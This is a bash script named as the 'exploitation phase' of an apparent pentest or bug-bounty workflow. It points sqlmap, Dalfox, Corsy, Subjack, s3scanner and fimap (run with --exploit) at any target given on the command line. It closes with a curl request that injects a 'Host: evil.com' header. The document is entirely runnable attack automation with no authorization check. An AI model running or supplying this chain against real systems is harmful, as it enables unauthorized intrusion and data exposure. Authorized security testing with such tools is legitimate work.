#!/bin/bash
# exploitation.sh - Exploitation Phase

TARGET=$1
OUTPUT_DIR=$2

mkdir -p $OUTPUT_DIR

# SQL Injection Testing
echo "[+] Running SQLMap..."
sqlmap -u $TARGET --batch --output-dir=$OUTPUT_DIR/sqlmap

# XSS Testing
echo "[+] Running Dalfox for XSS..."
dalfox file $OUTPUT_DIR/live_hosts.txt --output $OUTPUT_DIR/dalfox.txt

# CORS Misconfig Detection
echo "[+] Running Corsy..."
python3 Corsy/corsy.py -i $OUTPUT_DIR/live_hosts.txt -o $OUTPUT_DIR/corsy.json

# Subdomain Takeover
echo "[+] Running Subjack..."
subjack -w $OUTPUT_DIR/all_subs.txt -t 100 -timeout 30 -ssl -v -o $OUTPUT_DIR/subjack.txt -c fingerprints.json

# Open Redirect / SSRF / IDOR - Manual payloads to be tested with Burp/ZAP

# AWS S3 Bucket Check
echo "[+] Checking for open S3 buckets..."
s3scanner --bucket $TARGET -o $OUTPUT_DIR/s3.txt

# LFI / RFI Testing
fimap -u $TARGET --exploit -w $OUTPUT_DIR/fimap.txt

# Host Header Injection
curl -H "Host: evil.com" -I $TARGET > $OUTPUT_DIR/host-header.txt

--------------------------
